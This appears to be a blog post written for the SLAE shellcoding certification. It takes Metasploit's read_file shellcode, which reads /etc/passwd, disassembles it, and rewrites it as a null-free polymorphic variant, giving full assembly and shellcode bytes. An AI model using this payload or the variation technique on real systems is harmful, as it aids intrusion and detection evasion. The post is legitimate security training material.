

# Analyze: Read File

# Create shellcode
```bash
msfvenom -p linux/x86/read_file -f c PATH=/etc/passwd
```


# Analysis

## Disassemble w/ bash
```bash
echo -n "\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00" | ndisasm -u -
```

## Disassembled Assembly

```x86asm
00000000  EB36              jmp short 0x38
00000002  B805000000        mov eax,0x5
00000007  5B                pop ebx
00000008  31C9              xor ecx,ecx
0000000A  CD80              int 0x80
0000000C  89C3              mov ebx,eax
0000000E  B803000000        mov eax,0x3
00000013  89E7              mov edi,esp
00000015  89F9              mov ecx,edi
00000017  BA00100000        mov edx,0x1000
0000001C  CD80              int 0x80
0000001E  89C2              mov edx,eax
00000020  B804000000        mov eax,0x4
00000025  BB01000000        mov ebx,0x1
0000002A  CD80              int 0x80
0000002C  B801000000        mov eax,0x1
00000031  BB00000000        mov ebx,0x0
00000036  CD80              int 0x80
00000038  E8C5FFFFFF        call 0x2
0000003D  2F                das
0000003E  657463            gs jz 0xa4
00000041  2F                das
00000042  7061              jo 0xa5
00000044  7373              jnc 0xb9
00000046  7764              ja 0xac
00000048  00                db 0x00
```

Here I will dissect the assembly piece by piece, followed by a commented version of theh code in entirety.



## Disassembled (UPDATED)

Here I have cleaned and commented the code, as well as put it in a .nasm format.

I noticed there were a lot of null bytes in the shellcode generated from msfvenom, so my polymorphic code revolves around removing those null bytes.

The first substitution I made is replacing an `xor` with a `sub` to zero out the `ecx` register. Note that this strategy may not work with all CPUs.

```x86asm
; xor ecx,ecx     ; replace xor instruction
sub ecx,ecx
```

Next, the original shellcodes does the jmp, call, pop technique to get a pointer to a string. The string is the filename to be read. In this case, I want to remove null bytes from my shellcode, thus I will push values to the stack and move the stack pointer into my register. To push the string terminating null, I will load the string "/etc//passwd" onto the stack and get a pointer to it's address.

```x86asm
; pop ebx         ; <addr> 0x3D (filename from stack)
xor ebx, ebx
push ebx
push 0x64777373         ; "dwss"
push 0x61702f2f         ; "ap//"
push 0x6374652f         ; "cte/" 
mov ebx, esp
```

Note that I have pushed an entire dword of `0x00000000` to the stack as a string terminator by the `push ebx` instruction. Interestingly, I tried to rewrite this to push only a single `0x0` to the stack. I ended up with this code that will essentially load a `0xff` into `ebx` that will be shifted out for a null and placed onto the stack as a null terminator.

```x86asm
mov ebx, 0x647773ff  
shr ebx, 0x8
push ebx
push 0x7361702f         
push 0x6374652f         

mov ebx, esp
```

Unfortunately, this is an extra byte in length than the alternative solution above, so I opted not to use it. But it was fun to work with the `shr` instruction and get another polymorphic variation working.

Then, I change the `mov, 0x3` with an `xor` to clear the register and `mov al, 0x3` to move the value of 3 into the register without having zeros in the shellcode.

```x86asm
; mov eax,0x3     ; read()
xor eax, eax
mov al, 0x3
```

Similar to the above strategy, I remove a `mov edx, 0x1000` with a `mov dh, 0x10` to remove nulls in the shellcode and have the same result.

```x86asm
    ; mov edx,0x1000  ; buf = 4096
    mov dh, 0x10
```

I again use the same trick as before to replace the `mov eax, 0x4` instruction:
   
```x86asm
; mov eax,0x4     
xor eax, eax
mov al, 0x4 
```
   
And again with ebx. Except this time since I need a value of 1 in the register, I will use the `inc` instruction to increment it after setting it to 0x0.

```x86asm
; mov ebx,0x1     ; 1 = stdout (where to write output)
xor ebx, ebx
inc ebx
```

I do the same thing for the eax register later in the assembly code.

```x86asm
; mov eax,0x1 
xor eax, eax
inc eax
```

I then replace a `mov ebx, 0x0` with an `xor` to remove null bytes in this instruction.

```x86asm
; mov ebx,0x0     ; status = 0 = EXIT_SUCCESS
xor ebx, ebx
```

And that's it for the changes.

## Disassembled (Cleaned and commented)

Here I have cleaned and commented the final `.asm` code. I have left the instructions I replaced commented out.

```x86asm
global _start

section .text
_start:
    ;mov eax, 0x5
    push 0x5
    pop eax


    ; pop ebx         ; <addr> 0x3D (filename from stack)
    xor ebx, ebx
    push ebx
    push 0x64777373         ; "dwss"
    push 0x61702f2f         ; "ap//"
    push 0x6374652f         ; "cte/" 
    mov ebx, esp

    ; xor ecx,ecx     ; replace xor instructions
    sub ecx,ecx
    int 0x80        ; call open() 

    mov ebx,eax     ; ebx now holds file descriptor

    ; mov eax,0x3     ; read()
    xor eax, eax
    mov al, 0x3
                    ; man 2 read
                    ; ssize_t read(int fd, void *buf, size_t count);
    mov edi,esp     
    mov ecx,edi     ; ptr to stack : returned file content will fill this buffer
    ; mov edx,0x1000  ; buf = 4096
    mov dh, 0x10
    int 0x80        ; call read()

    mov edx,eax     ; edx holds number of bytes returned from read()

    ; mov eax,0x4     ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 4$"
    xor eax, eax
    mov al, 0x4 
                    ; write()
                    ; man 2 write
                    ; ssize_t write(int fd, const void *buf, size_t count);
    ; mov ebx,0x1     ; 1 = stdout (where to write output)
    xor ebx, ebx
    inc ebx

    int 0x80        ; call write() 
                    ; NOTE: ecx still points to stack (buffer to write)

    ; mov eax,0x1     ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 1$"
    xor eax, eax
    inc eax

                    ; man exit
                    ; void exit(int status);
    ; mov ebx,0x0     ; status = 0 = EXIT_SUCCESS
    xor ebx, ebx

    int 0x80        ; call exit()
```

## New Shellcode

```c
"\x6a\x05\x58\x31\xdb\x53\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x29\xc9\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x89\xe7\x89\xf9\xb6\x10\xcd\x80\x89\xc2\x31\xc0\xb0\x04\x31\xdb\x43\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80"
```


## Conclusion

Metasploit payload was 73 bytes with nulls.

My new shellcode is 59 bytes without nulls.



# Certification Requirements

This blog post has been created for completing the requirements of the SecurityTube/PentesterAcademy [x86 Assembly Language and Shellcoding on Linux (SLAE)](https://www.pentesteracademy.com/course?id=3) certification:

Student ID: SLAE-alecjmaly

